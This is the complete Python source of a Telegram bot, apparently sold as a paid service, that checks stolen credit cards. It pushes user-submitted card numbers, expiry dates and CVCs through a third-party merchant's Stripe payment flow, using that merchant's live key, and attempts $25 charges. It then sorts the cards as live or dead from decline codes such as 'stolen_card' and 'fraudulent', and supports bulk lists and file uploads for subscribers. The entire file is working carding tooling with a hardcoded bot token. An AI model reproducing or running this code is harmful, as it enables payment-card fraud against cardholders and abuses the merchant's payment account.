import telebot,time,os
from telebot import types
import requests
import user_agent,random
from user_agent import generate_user_agent

TOKEN = '5601547722:AAEUYujEaWjyy4_UhzfnQwdzXphTcY6Rsig'
BLACKLISTED = '510805','434258','434256','601149','379248','423223'
PREFIX = '/start'
OWNER = 1110953194
ANTISPAM = 5
SUPER_USER = open('super.txt','r').read().split()
MAX_CHK_S = 30
MAX_CHK_F = 5
bot = telebot.TeleBot(TOKEN)

def Bb(BIN):
	global e_co,co,bank,level,type,brand,binh
	BIN = str(BIN)
	if len(BIN) < 6:
		binh = False
	else:
		nuu = '4563'
		if str(BIN[0]) not in nuu:
			brand,type,level,bank,co,e_co = 'None','None','None','None','None','None'
			binh = False
		else:
			try:
				r = requests.get(f'http://binchk-api.vercel.app/bin={BIN}').json()
				status = r["status"]
			except:
				brand,type,level,bank,co,e_co = 'None','None','None','None','None','None'
				binh = 'Error Chk BIN ❌'
			try:
				if status == True:
					binh = '<b>Valid Bin ✅</b>'
				else:
					binh = 'Error Chk BIN ❌'
			except:
				brand,type,level,bank,co,e_co = 'None','None','None','None','None','None'
				binh = 'Error Chk BIN ❌'
			try:
				brand = r["brand"]
			except:
				brand = '--------'
			try:
				type = r["type"]
			except:
				type =  '--------'
				
			try:
				level = r["level"]
			except:
				level =  '--------'
				
			try:
				bank = r["bank"]
			except:
				bank =  '--------'
				
			try:
				co = r["country"]
			except:
				co =  '--------'
				
			try:
				e_co = r["flag"]
			except:
				e_co =  '---'


		


def check(cc,mm,yy,ccv):
	global status,message,error_code,decline_code,param,eed
	c = 'qwertyuiopasdfghjklzxcvbnm'
	cx = ''.join(random.choice(c) for i in range (6))

	headers = {
    'Accept': 'application/json',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    # Already added when you pass json=
    # 'Content-Type': 'application/json',
    'Origin': 'https://chat.kuki.ai',
    'Referer': 'https://chat.kuki.ai/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': generate_user_agent(),
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	json_data = {
    'id': 'b08cb34d29ec7ea3',
    'cart': [
        {
            'k100': 1,
        },
    ],
}

	response = requests.post('https://kuli.kuki.ai/create-payment-intent', headers=headers, json=json_data)
	
	pi = response.json()['clientSecret']
	pii = pi.split('_')[1]
	
	print(response.text)
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent()
}

	data = f'payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={ccv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=7ce29228-eafe-4ae3-83df-f0e86d50b7ca7c1fb7&payment_method_data[muid]=032f6277-4407-4934-8b94-5f9b46565a82918b69&payment_method_data[sid]=4a110a47-229a-4608-88d4-968906e462d840d3c1&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F4f40f78af%3B+stripe-js-v3%2F4f40f78af&payment_method_data[time_on_page]=194625&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51KKStbLPdRvyXL2Ha61mjXPKpBGq7eSzBlwgBzvR2k6tgQYXRzZUMvrGN7aoAI8VYe2H5nSsnkM3po62fZZHMJUV00CXvISI56&client_secret={pi}'

	time.sleep(2)
	response2 = requests.post(f'https://api.stripe.com/v1/payment_intents/pi_{pii}/confirm', headers=headers, data=data)
	eed = (response2.text)
	print(eed)



	try:
		status = response2.json()['status']
		if status == 'succeeded':
			message = 'Done Charge 25$'
			error_code,decline_code,param = 'None','None','None'
		if status == 'requires_action':
			message = '3D Security'
			error_code,decline_code,param = 'None','None','None'
	
	except:
		status = 'None'
		if 'error' in response2.text:
			try:
				message = response2.json()['error']['message']
			except:
				message = 'None'
				
			try:
				error_code = response2.json()['error']['code']
			except:
				error_code = 'None'
            
			try:
				decline_code = response2.json()['error']['decline_code']
			except:
				decline_code = 'None'
            	
			try:
				param = response2.json()['error']['param']
			except:
				param = 'None'
		else:
			message = ('Error chk !!')
			status,param,error_code,decline_code = 'None','None','None','None'


def ahmed(cc,mm,yy,ccv):
	global status,message,error_code,decline_code,param,chk,ch,ccn,chaar

	try:
		check(cc,mm,yy,ccv)
	
		if status == 'requires_action':
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Declined ❌'
			chaar = '3D Security 🛂'
		
		if error_code == 'incorrect_number':
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'incorrect_cvc':
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Approved ✅'
			chaar = 'None'
			
		if error_code == 'invalid_cvc':
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'card_declined' and decline_code == 'fraudulent':
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'card_declined' and decline_code == 'generic_decline' and param != "":
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
		
		if error_code == 'card_declined' and decline_code == 'do_not_honor':
			chk = 'Approved ❌'
			ch = 'Approved ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'card_declined' and param == '':
			chk = 'Approved ✅'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
	
		if status == 'succeeded':
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Approved ✅'
			chaar = '+25$ ✅'
			
		if 'insufficient_funds' in eed:
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Approved ✅'
			chaar = '-25$ ✅'
			
		if error_code == 'card_declined' and decline_code == 'stolen_card' '':
			chk = 'Approved ✅'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'invalid_expiry_month':
			chk = 'Invalid Expiry ❌'
			ch = 'Invalid Expiry ❌'
			ccn = 'Invalid Expiry ❌'
			chaar = 'None'
			
		if error_code == 'invalid_expiry_year':
			chk = 'Invalid Expiry ❌'
			ch = 'Invalid Expiry ❌'
			ccn = 'Invalid Expiry ❌'
			chaar = 'None'
			
	except Exception as e:
		print(e)
		chk = 'Error check ❗'
		ch =  'Error check ❗'
		ccn =  'Error check ❗'
		error_code = 'None'
		decline_code = 'None'
		param = 'None'
		chaar = 'None'

def ms_chk(message,com):
	message = message.text
	mm = message.split(com)[1]
	m = message.splitlines()
	#print(mm)
	if len(m) <= 10:
		visa = message.split(com)[1]
		return(visa)
	elif len(m) > 10:
		return('error')

bot_info = bot.get_me()
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id


def dates_inline():

    # Inline keyboard
    keyboard_dates = telebot.types.InlineKeyboardMarkup()
    but_0 = types.InlineKeyboardButton(text='Cmds', callback_data='0')
    but_8 = types.InlineKeyboardButton(text='How used?', callback_data='8')
    keyboard_dates.add(but_0)
    keyboard_dates.add(but_8)
    return keyboard_dates

def dates_inline4():

    # Inline keyboard
    keyboard_dates = telebot.types.InlineKeyboardMarkup()
    but_9 = types.InlineKeyboardButton(text='BACK', callback_data='9')
    keyboard_dates.add(but_9)
    return keyboard_dates

def dates_inline2():
    # Inline keyboard
    keyboard_dates = telebot.types.InlineKeyboardMarkup()
    but_1 = types.InlineKeyboardButton(text='CHK',callback_data='1')
    but_2 = types.InlineKeyboardButton(text='CH', callback_data='2')
    but_3 = types.InlineKeyboardButton(text='CCN', callback_data='3')
    but_4 = types.InlineKeyboardButton(text='BIN', callback_data='4')
    but_7 = types.InlineKeyboardButton(text='SUPER USER ⚡', callback_data='7')
    but_5 = types.InlineKeyboardButton(text='↩️ BACK', callback_data='5')
    
    keyboard_dates.add(but_1,but_2)
    keyboard_dates.add(but_3,but_4)
    keyboard_dates.add(but_7)
    keyboard_dates.add(but_5)
    return keyboard_dates
    
def dates_inline3():

    # Inline keyboard
    keyboard_dates = telebot.types.InlineKeyboardMarkup()
    but_6 = types.InlineKeyboardButton(text='↩️ BACK', callback_data='6')
    keyboard_dates.add(but_6)
    return keyboard_dates

def dates_inline5():

    # Inline keyboard
    keyboard_dates = telebot.types.InlineKeyboardMarkup()
    but_10 = types.InlineKeyboardButton(text='↩️ BACK', callback_data='10')
    keyboard_dates.add(but_10)
    return keyboard_dates
@bot.message_handler(commands=['start','help'])
def start_message(message):
	global x
	name = message.chat.first_name
	user = message.chat.username
	id_user = int(message.chat.id)

#	us = open('users.txt','r').readlines()
#	mser = (f'''{id_user} | {user} | {name} \n''')
#	users = []
#	for i in us:
#		us = i.split(' |')[0]
#		users.append(us)

#	if id_user in users:
#		gg = False
#	else:
#		gg = True

#	if gg == True:
#		with open('users.txt','a')as gf:
#			gf.write(mser)
#			gf.close()

	SUPER_USER = open('super.txt','r').read().split()
	name = message.chat.first_name

	user = message.chat.username
	id_user = int(message.chat.id)
	#print(name+'\n')

	x = bot.send_message(message.chat.id,f'''
Hello {name}, Im {BOT_NAME}
U can find my Boss @RRR28R''',reply_markup=dates_inline())
	#xx = x.message_id
	@bot.callback_query_handler(func=lambda call: True)
	def choose_date(call):
		xx = call.message.message_id
		name = call.from_user.first_name
		id_user=(call.from_user.id)
		#print(name)
#		print(x)
		dt = int(call.data)
		
		if dt == 10:
			g = bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
Hello {name}, Im {BOT_NAME}
U can find my Boss @RRR28R''',reply_markup=dates_inline2())

		if dt == 0:
			g = bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
Hello {name}, Im {BOT_NAME}
U can find my Boss @RRR28R''',reply_markup=dates_inline2())
		if dt == 6:
			g = bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
Hello {name}, Im {BOT_NAME}
U can find my Boss @RRR28R''',reply_markup=dates_inline2())

		if dt == 7:
			g = bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
SUPER SUBSCRIP ⚡️


IT has the following features:
    Chk 50 cards at once ⚜️
    Chk 50 cards in a file ⚜️
    Opens you the /ch /chk /ccn 🌟

Subscription prices:
     one week $5
     one month $15

Send Me @RRR28R To Subscrip  ✅''',reply_markup=dates_inline5())

		if dt == 5 or dt == 9:
			bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
Hello {name}, Im {BOT_NAME}
U can find my Boss @RRR28R''',reply_markup=dates_inline())
		if dt == 1:
			bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
/chk
  ↳ This cmds To chk CVC
  ↳ Super users only ⚡
  ↳ On ✅''',reply_markup=dates_inline3())

		if dt == 2:
			bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
/ch
  ↳ This cmds To chk Charge 25$
  ↳ On ✅
  ↳ Super users only ⚡️''',reply_markup=dates_inline3())


		if dt == 4:
			bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
/bin
  ↳ This cmds To chk BIN
  ↳ On ✅''',reply_markup=dates_inline3())

		if dt == 3:
			bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
/ccn
  ↳ This cmds To chk CCN
  ↳ Super users only ⚡
  ↳ On ✅''',reply_markup=dates_inline3())

		if dt == 8:
			bot.edit_message_text(chat_id=id_user, message_id=xx, text=f'''
[check One card]

- send the card Like this 
➡️ /cmds xxxxxxxxxxxxxxxx|xx|xxxx|xxx



[check a lot cards]

- send list Like this 
➡️ /cmds xxxxxxxxxxxx|xx|xxxx|xxx
xxxxxxxxxxxx|xx|xxxx|xxx
xxxxxxxxxxxx|xx|xxxx|xxx
.....



[check file cards]

- send your file to me
His name must be like this (cmds.txt) => chk.txt or ch.txt ''',reply_markup=dates_inline4())


@bot.message_handler(content_types=['document'])
def choose_message(message):
	SUPER_USER = open('super.txt','r').read().split()
	id_user = str(message.chat.id)
	if id_user in SUPER_USER:
		pass
	else:
		return bot.send_message(chat_id=message.chat.id,text=f'[error_Sub] this cmds for Subscribers Only.',reply_to_message_id=message.message_id)
	id_user = int(message.chat.id)
	uss = message.chat.username
	name = (message.document.file_name)
	com = name.split('.')[0]
	#print(com)
	if name == 'chk.txt' or name == 'ch.txt' or name == '3d.txt' or name == 'cc.txt' or name == 'bin.txt':
		x22 = bot.send_message(chat_id=message.chat.id,text=f'wait for check ({name})..',reply_to_message_id=message.message_id)
		
		file_info = bot.get_file(message.document.file_id)
		file_name = message.document.file_name
		do = bot.download_file(file_info.file_path)
		if str(message.chat.id) in SUPER_USER:
			user_sub = True
		else:
			user_sub = False
		
		do_s = (do.split())

		if user_sub == True:
			if len(do_s) <= MAX_CHK_S:
				fof_name =str(id_user)+'.txt'
				with open(fof_name,'wb') as new_file:
					new_file.write(do)
					new_file.close()
				
				cchk = open(fof_name,'r').read()
				cchk = cchk.split()

				list_visa = []
				rode = 0
				for i in cchk:
					rode+=1
					time.sleep(1)
					visa = i
					try:
						cc = visa.split('|')[0]
						mm = visa.split('|')[1]
						yy = visa.split('|')[2]
						ccv = visa.split('|')[3]
						card = cc+'|'+mm+'|'+yy+'|'+ccv
						#print(card)
						BIN = cc[0:6]
						lole = int(len(card))
						bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'Done check ({rode}) From ({file_name}).')
						BIN = cc[0:6]
						shq = '-'*55
						if lole == 28 or lole == 26:
							ahmed(cc,mm,yy,ccv)
							if com == 'chk':
								harb = chk
							if com == 'ch':
								harb = ch
							if com == 'ccn':
								harb = ccn
							Bb(BIN)
							card_chk =  f'''{shq}\n[{harb}] {card}\ncode: {error_code} | decline_code: {decline_code}\nCountry: {co} {e_co}\n'''
							list_visa.append(card_chk)
								
						else:
							Bb(BIN)
							card_chk =  f'''{shq}\n[❗] {card}\ncode: None | declined_code: None\nCountry: {co} {e_co}\n'''
							list_visa.append(card_chk)	

							list_visa.append(card_chk)
					except:
						Bb(BIN)
						shq = '-'*55
						card_chk = f'''{shq}\n[❗] {card}\ncode: None | declined_code: None\nCountry: {co} {e_co}\n'''
						
				xccc = (''.join(list_visa))
				mxxx = f'''##Done check By DefCHK_bot##\n##The Owner @RRR28R##\n\n\n{xccc}{shq}\n\nChk By: @{uss} [SUPER USER ⚡]'''

				with open(fof_name,'w') as f:
					f.write(mxxx)
					f.close()
				bot.delete_message(chat_id=message.chat.id, message_id=x22.message_id)
				
				sendd_test = open(fof_name,'r').read()
				sendd = open(fof_name,'rb')
				bot.send_document(message.chat.id,document=sendd,caption=f'''Chk By: @{uss} [<b>SUPER USER ⚡</b>]
👨‍💻 | BOT @DefCHK_bot BY @RRR28R''',parse_mode='html',reply_to_message_id=message.message_id)
				os.remove(fof_name)

			elif len(do_s) > MAX_CHK_S:
				return bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'[error_file] you can\'t check more than {MAX_CHK_S}.')
				

	
			else:
				return bot.send_message(message.chat.id,f'[error_name] plesae send /help and choice (How used?)')




		elif user_sub == False:
			if len(do_s) <= MAX_CHK_F:
				fof_name =str(id_user)+'.txt'
				with open(fof_name,'wb') as new_file:
					new_file.write(do)
					new_file.close()
				
				cchk = open(fof_name,'r').read()
				cchk = cchk.split()

				list_visa = []
				rode = 0
				for i in cchk:
					rode+=1
					time.sleep(1)
					visa = i
					try:
						cc = visa.split('|')[0]
						mm = visa.split('|')[1]
						yy = visa.split('|')[2]
						ccv = visa.split('|')[3]
						carrd = cc+'|'+mm+'|'+yy+'|'+ccv
						lole = int(len(card))
						bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'Done check ({rode}) From ({file_name}).')
						shq = '-'*55
						BIN = carrd[0:6]
						if lole == 28 or lole == 26:
							Bb(BIN)
							ahmed(cc,mm,yy,ccv)
							if com == 'chk':
								harb = chk
							if com == 'ch':
								harb = ch
							if com == 'ccn':
								harb = ccn
							card_chk =  f'''{shq}\n[{harb}] {card}\ncode: {error_code} | decline_code: {decline_code}\nCountry: {co} {e_co}\n'''
							list_visa.append(card_chk)
								
						else:
							Bb(BIN)
							card_chk =  f'''{shq}\n[❗] {card}\ncode: None | declined_code: None\nCountry: {co} {e_co}\n'''
							list_visa.append(card_chk)	

							list_visa.append(card_chk)
					except:
						Bb(BIN)
						card_chk = f'''{shq}\n[❗] {card}\ncode: None | declined_code: None\nCountry: {co} {e_co}\n'''
						
				xccc = (''.join(list_visa))
				mxxx = f'''##Done check By DefCHK_bot##\n##The Owner @RRR28R##\n\n\n{xccc}{shq}\n\nChk By: @{uss} [FREE USER]'''

				with open(fof_name,'w') as f:
					f.write(mxxx)
					f.close()
				bot.delete_message(chat_id=message.chat.id, message_id=x22.message_id)
				
				sendd_test = open(fof_name,'r').read()
				sendd = open(fof_name,'rb')
				bot.send_document(message.chat.id,document=sendd,caption=f'''Chk By: @{uss} [<b>FREE USER</b>]
👨‍💻 | BOT @DefCHK_bot BY @RRR28R''',parse_mode='html',reply_to_message_id=message.message_id)
				os.remove(fof_name)

			elif len(do_s) > MAX_CHK_F:
				return bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'[error_file] you are Free user can\'t check more than {MAX_CHK_F}.')
				

	
			else:
				return bot.send_message(message.chat.id,f'[error_name] plesae send /help and choice (How used?)')


def msms1():
	global mero
	mero = (f'''<b>CC</b>: <code>{card}</code>
<b>OUTPUT</b>: {chk}
<b>Message</b>: {message}
<b>Code</b>: {error_code}
<b>ErrorCode</b>: {decline_code}
<b>BinData</b>: {BIN} - {brand} - {type}
<b>Country</b>: {co} {e_co}
<b>Took</b>: {toc - tic:0.2f}

Chk By: @{user} [<b>{uus}</b>]
👨‍💻 | BOT @DefCHK_bot BY @RRR28R''')

def msms2():
	global mero
	mero = (f'''<b>CC</b>: <code>{card}</code>
<b>OUTPUT</b>: {ch}
<b>Charge</b>: {chaar}
<b>Message</b>: {message}
<b>Code</b>: {error_code}
<b>ErrorCode</b>: {decline_code}
<b>BinData</b>: {BIN} - {brand} - {type}
<b>Country</b>: {co} {e_co}
<b>Took</b>: {toc - tic:0.2f}

Chk By: @{user} [<b>{uus}</b>]
👨‍💻 | BOT @DefCHK_bot BY @RRR28R''')

def msms3():
	global mero
	mero = (f'''<b>CC</b>: <code>{card}</code>
<b>OUTPUT</b>: {ccn}
<b>Message</b>: {message}
<b>Code</b>: {error_code}
<b>ErrorCode</b>: {decline_code}
<b>BinData</b>: {BIN} - {brand} - {type}
<b>Country</b>: {co} {e_co}
<b>Took</b>: {toc - tic:0.2f}

Chk By: @{user} [<b>{uus}</b>]
👨‍💻 | BOT @DefCHK_bot BY @RRR28R''')

def cchhkk(message):
	global card,ccn,chk,ch,msear,error_code,decline_code,BIN,brand,type,co,e_co,tic,toc,user,uus
	SUPER_USER = open('super.txt','r').read().split()
	if str(message.chat.id) in SUPER_USER:
		user_sub = True
	else:
		user_sub = False
	user = message.chat.username
	ms = message.text
	com = ms.split('/')[1]
	com = com.split(' ')[0]
	x22 = bot.send_message(chat_id=message.chat.id,text=f'wait for {com}..',reply_to_message_id=message.message_id)
	tic = time.perf_counter()
	try:
		mss = ms.split(f'/{com} ')[1]
		list_user = mss.split()
		leenn = (len(list_user))
		if user_sub == True:
			uus = 'SUPER USER ⚡'
		elif user_sub == False:
			uus = 'FREE USER'
		if user_sub == True:
			maxe = MAX_CHK_S
		elif user_sub == False:
			maxe = MAX_CHK_F
		if leenn == 1:
			visa = (mss)
			cc = visa.split('|')[0]
			mm = visa.split('|')[1]
			yy = visa.split('|')[2]
			ccv = visa.split('|')[3]
			card = cc+'|'+mm+'|'+yy+'|'+ccv
						#print(user)
			BIN = cc[0:6]
						#print(card)

			
			if com == 'chk':		
				ahmed(cc,mm,yy,ccv)
				Bb(BIN)
				toc = time.perf_counter()
				msms1()
				mmse = mero
				toc = time.perf_counter()
				bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=mmse,parse_mode='html')
			
			if com == 'ch':
				print('her')
				ahmed(cc,mm,yy,ccv)
				Bb(BIN)
				toc = time.perf_counter()
				msms2()
				mmse = mero
				
				bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=mmse,parse_mode='html')
				
			if com == 'ccn':
				ahmed(cc,mm,yy,ccv)
				Bb(BIN)
				toc = time.perf_counter()
				msms3()
				mmse = mero
				bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=mmse,parse_mode='html')

		elif leenn > 1:
			list_visa = []
			for i in list_user:
					visa = i
					try:
						cc = visa.split('|')[0]
						mm = visa.split('|')[1]
						BIN = cc[0:6]
						yy = visa.split('|')[2]
						ccv = visa.split('|')[3]
						card = cc+'|'+mm+'|'+yy+'|'+ccv
					except:
						card_chk =  f'''{shq}\n[❗]  <code>{card}</code>\n<b>code</b>: None | <b>declined_code</b>: None\n<b>Country</b>: None\n'''
						list_visa.append(card_chk)
					lole = int(len(card))
					shq = '-' * 39
					if lole == 28 or lole == 26:
						Bb(BIN)
						ahmed(cc,mm,yy,ccv)
						if com == 'chk':
							harb = chk
						if com == 'ch':
							harb = ch
						if com == 'ccn':
							harb = ccn
						card_chk =  f'''{shq}\n[{harb}] <code>{card}</code>\n<b>code</b>: {error_code} | <b>decline_code</b>: {decline_code}\n<b>Country</b>: {co} {e_co}\n'''
						list_visa.append(card_chk)
								
					else:
						Bb(BIN)
						card_chk =  f'''{shq}\n[❗]  <code>{card}</code>\n<b>code</b>: None | <b>declined_code</b>: None\n<b>Country</b>: {co} {e_co}\n'''
						list_visa.append(card_chk)
					ger = (''.join(list_visa))+shq+'\n\n'+f'''Chk By: @{user} [<b>{uus}</b>]
👨‍💻 | BOT @DefCHK_bot BY @RRR28R'''
					bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=ger,parse_mode='HTML')

		elif leenn > maxe:
			if user_sub == True:
				return bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'[error_cards] can\'t check more than {MAX_CHK_S}.')
			elif user_sub == False:
				return bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'[error_cards] you are Free user can\'t check more than {MAX_CHK_F}.')
	

	except Exception as e:
		print(e)
		return bot.edit_message_text(chat_id=message.chat.id, message_id=x22.message_id, text=f'[error] was error in Response.')
		pass


@bot.message_handler(commands=['chk'])
def stss(message):
	SUPER_USER = open('super.txt','r').read().split()
	if str(message.chat.id) in SUPER_USER:
		user_sub = True
	else:
		user_sub = False
	if user_sub == True:
		return cchhkk(message)
	else:
		return bot.send_message(chat_id=message.chat.id,text=f'[error_Sub] this cmds for Subscribers Only.',reply_to_message_id=message.message_id)

@bot.message_handler(commands=['ch'])
def stsss(message):
	SUPER_USER = open('super.txt','r').read().split()
	if str(message.chat.id) in SUPER_USER:
		user_sub = True
	else:
		user_sub = False
	if user_sub == True:
		return cchhkk(message)
	else:
		return bot.send_message(chat_id=message.chat.id,text=f'[error_Sub] this cmds for Subscribers Only.',reply_to_message_id=message.message_id)


@bot.message_handler(commands=['ccn'])
def stsss(message):
	SUPER_USER = open('super.txt','r').read().split()
	if str(message.chat.id) in SUPER_USER:
		user_sub = True
	else:
		user_sub = False
	if user_sub == True:
		return cchhkk(message)
	else:
		return bot.send_message(chat_id=message.chat.id,text=f'[error_Sub] this cmds for Subscribers Only.',reply_to_message_id=message.message_id)

@bot.message_handler(commands=['bin'])
def bin(message):
	tic = time.perf_counter()
	try:
		BIN = message.text.split('/bin ')[1]
	except:
		BIN = ''
	x223 = bot.send_message(chat_id=message.chat.id,text=f'wait for bin..',reply_to_message_id=message.message_id)
	
	Bb(BIN)
	if binh == False:
		return bot.edit_message_text(chat_id=message.chat.id, message_id=x223.message_id, text='<b>Invalid Bin ❌</b>',parse_mode='HTML')
	else:
		toc = time.perf_counter()
		INFO = f'''{binh}

<b>BIN</b> ⇢ <code>{BIN}</code>
<b>Brand</b> ⇢ <u>{brand}</u>
<b>Type</b> ⇢ <u>{type}</u>
<b>Level</b> ⇢ <u>{level}</u>
<b>Bank</b> ⇢ <u>{bank}</u>
<b>Country</b> ⇢ <u>{co} {e_co}</u>
<b>Took</b> ⇢<u> {toc - tic:0.2f} </u>
'''
		return bot.edit_message_text(chat_id=message.chat.id, message_id=x223.message_id, text=INFO,parse_mode='HTML')

@bot.message_handler(commands=['info'])
def stsss(message):
	SUPER_USER = open('super.txt','r').read().split()
	id_user = str(message.chat.id)
	uss = message.chat.username
	name = message.chat.first_name
	if str(message.chat.id) in SUPER_USER:
		stat = 'SUPER USER ⚡'
	else:
		stat = 'FREE USER'
	ms = (f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{id_user}</code>
<b>USERNAME:</b> @{uss}
<b>FIRSTNAME:</b> {name}
<b>STATUS:</b> {stat}
<b>BOT:</b> @{BOT_USERNAME}
<b>BOT-OWNER:</b> (@RRR28R)
╘═════════''')
	return bot.send_message(message.chat.id,text=ms,parse_mode='html',reply_to_message_id=message.message_id)

@bot.message_handler(commands=['sup'])
def choose_message(message):
	id_user = str(message.chat.id)
	uss = message.chat.username
	start = bot.send_message(chat_id=message.chat.id,text=f'Mr [@{uss}]\nPls wait For Subscribe 🛂..',reply_to_message_id=message.message_id)
	SUPER_USER = open('super.txt','r').read().split()
	if id_user in SUPER_USER:
		return bot.edit_message_text(chat_id=message.chat.id, message_id=start.message_id, text='[error_Subscribe] You are really a Super User ⚡')
	else:
		print(id_user,uss)
		time.sleep(59)
		sos = open('super.txt','r').read().split()
		if id_user in sos:
			bot.delete_message(chat_id=message.chat.id, message_id=start.message_id)
			return bot.send_message(chat_id=message.chat.id,text=f'Hi @{uss} 😊.\nYour Subscription is active Now ⚡✅\n\n    THX:@RRR28R')
		else:
			bot.delete_message(chat_id=message.chat.id, message_id=start.message_id)
			return bot.send_message(chat_id=message.chat.id,text=f'Hi @{uss}.\nYour subscription has not been activated. Please send the developer [@RRR28R] if something goes wrong.',reply_to_message_id=message.message_id)
	

bot.polling(skip_pending=True,none_stop=True,timeout=5)
